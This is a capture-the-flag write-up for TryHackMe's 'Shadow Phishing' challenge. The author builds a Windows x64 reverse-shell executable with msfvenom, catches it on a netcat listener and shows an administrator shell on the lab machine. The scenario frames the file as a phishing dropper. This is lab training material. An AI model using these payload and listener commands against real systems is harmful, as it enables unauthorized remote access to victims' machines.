---
image: "/assets/img/posts/a_5bc02cb996.png"
title: "Shadow Phishing"
description: "As part of the Hackfinity Battle on TryHackMe, the challenge"
pubDate: "2025-03-26"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Analyse





The email from Cipher specifies that we must create an executable named SilentEdge Installer which works on Windows 10 x64. Although the email does not explicitly mention antivirus, the context of the Shadow Phishing challenge suggests that the EXE could be used in a phishing campaign to install a backdoor.





My objective was therefore to:





Generate a reverse shell payload with msfvenom. Configure a listener to receive the connection. Submit the executable to validate the challenge via dead drop.


## Resolution





First to solve this challenge, I will start with a basic msfvenom to create a payload in .exe and see if it will work or if the antivirus will flag it





  `








```bash


$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe -o hack.exe


[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload


[-] No arch selected, selecting arch: x64 from the payload


No encoder specified, outputting raw payload


Payload size: 460 bytes


Final size of exe file: 7168 bytes


Saved as: hack.exe





$ sudo rlwrap nc -lnvp 1337


listening on [any] 1337 ...


connect to [10.6.8.193] from (UNKNOWN) [10.10.254.169] 49899


Microsoft Windows [Version 10.0.17763.1821]


(c) 2018 Microsoft Corporation. All rights reserved.





C:\Windows\system32>whoami


whoami


fisher\administrator





C:\Windows\system32>





```


`





I generated a payload with msfvenom by using windows/x64/shell_reverse_tcp, which is compatible with Windows 10 x64. I specified my LHOST as tun0 (my IP on the TryHackMe VPN network, here 10.6.8.193) and the LPORT as 1337. The generated file, hack.exe, is 7168 bytes.





Next, I configured a listener with netcat by using sudo rlwrap nc -lnvp 1337 to receive the reverse shell connection. After running hack.exe on the target machine (a Windows 10 x64 machine provided by the challenge), I received a connection on my listener. The whoami command confirmed that I had a shell with privileges of user fisher\administrator, which means that we have administrator access.





[![Hacked](/assets/img/posts/hacked_b1a2a4cd3a.png)](https://i.ibb.co/0yKwv6m6/hacked.png)





## Conclusion





The Shadow Phishing challenge allowed me to strengthen my skills in creating malicious payloads and simulating phishing attacks, key techniques for RedTeam operations. I particularly appreciated the realism of the scenario, which features communication between two malicious actors and a concrete task of creating a dropper. Many thanks to TryHackMe for this stimulating challenge!





## Ressources supplementaires





Here are some additional resources that might be helpful to you:





Love my artciles? Follow me on [Twitter](https://x.com/@MrR0807) and [Github](https://github.com/0xMrR0807)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=TryHackMe%20-%20Shadow%20Phishing%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fshadow-phishing%2F)       [](https://www.facebook.com/sharer/sharer.php?title=TryHackMe%20-%20Shadow%20Phishing%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fshadow-phishing%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fshadow-phishing%2F&text=TryHackMe%20-%20Shadow%20Phishing%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fshadow-phishing%2F)


